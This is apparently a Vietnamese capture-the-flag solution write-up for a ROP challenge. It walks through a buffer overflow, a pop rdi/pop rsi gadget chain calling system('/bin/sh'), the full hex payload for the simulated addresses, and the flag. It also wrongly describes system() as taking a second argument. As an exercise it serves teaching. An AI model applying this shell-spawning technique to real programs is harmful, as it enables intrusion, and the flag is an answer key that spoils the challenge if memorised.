# Thử thách 28: ROPChain - Giải pháp

## Mô tả
Thử thách này mô phỏng kỹ thuật khai thác **Return-Oriented Programming (ROP)**. Bạn phải xây dựng một chuỗi các chỉ lệnh (Gadgets) trên Stack để sắp xếp dữ liệu vào các thanh ghi `rdi` và `rsi` trước khi nhảy tới gọi hàm `system()`.

## Lỗ hổng
Chương trình chứa lỗi Tràn bộ đệm (Buffer Overflow) kinh điển cho phép bạn ghi đè địa chỉ trả về (Return Address). Tuy nhiên, không giống như các bài tập cơ bản, bài này không hề có sẵn hàm `win()` nào để bạn nhảy tới. Bắt buộc bạn phải tự mình gọi lệnh `system("/bin/sh", 0)`.

Theo quy ước gọi hàm chuẩn (Calling Convention) của kiến trúc Linux x86-64:
- Đối số (Tham số) thứ nhất phải được truyền vào thanh ghi `rdi`.
- Đối số thứ hai phải được truyền vào thanh ghi `rsi`.

## Khai thác (Exploit)
Chúng ta cần thiết kế một chuỗi Payload lấp đầy Stack sao cho trông như sau:
1. `40 bytes` đệm rác (Gồm 32 bytes của Buffer + 8 bytes của Saved RBP).
2. Địa chỉ của gadget: `pop rdi; ret;`
3. Địa chỉ của chuỗi ký tự `'/bin/sh'` (Giá trị này sẽ được pop thẳng vào `rdi`).
4. Địa chỉ của gadget: `pop rsi; ret;`
5. Giá trị `0x0` (Giá trị NULL này sẽ được pop vào `rsi`).
6. Địa chỉ của hàm `system()`.

**Các địa chỉ được thử thách cung cấp (bạn không cần tìm):**
- Gadget `pop rdi; ret;` = `0x400010`
- Gadget `pop rsi; ret;` = `0x400020`
- Chuỗi `'/bin/sh'` = `0x400030`
- Hàm `system()` = `0x400040`

**Xây dựng tải trọng (Dạng Little Endian):**
- Đệm rác (Padding): `41` lặp 40 lần
- `pop rdi`: `1000400000000000` (đảo ngược byte của 0x400010)
- `'/bin/sh'`: `3000400000000000`
- `pop rsi`: `2000400000000000`
- `0x0`: `0000000000000000`
- `system()`: `4000400000000000`

Chuỗi Payload Hexadecimal hoàn chỉnh:
`4141414141414141414141414141414141414141414141414141414141414141414141414141414110004000000000003000400000000000200040000000000000000000000000004000400000000000`
*(Lưu ý viết liền không khoảng cách)*

Gửi chuỗi Hex này khi chương trình yêu cầu.

## Flag
```
FCTF{r0p_ch41n_m4st3r_g4dg3ts}
```
